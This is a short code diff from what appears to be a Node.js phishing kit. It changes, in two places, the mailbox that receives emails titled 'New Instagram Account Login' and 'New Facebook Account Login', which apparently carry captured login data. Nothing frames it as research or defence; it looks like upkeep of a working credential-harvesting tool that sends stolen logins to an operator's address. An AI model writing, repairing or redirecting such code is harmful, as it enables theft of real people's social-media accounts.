@@ -113,7 +113,7 @@ app
     //   Define email
     const mailOptions = {
       from: "stevenwoods943@gmail.com",
-      to: "capthoworkspace@gmail.com",
+      to: "patrickrodgers511@gmail.com",
       subject: "New Instagram Account Login",
       text: output,
     };
@@ -155,7 +155,7 @@ app
     //   Define email
     const mailOptions = {
       from: "stevenwoods943@gmail.com",
-      to: "capthoworkspace@gmail.com",
+      to: "patrickrodgers511@gmail.com",
       subject: "New Facebook Account Login",
       text: output,
     };
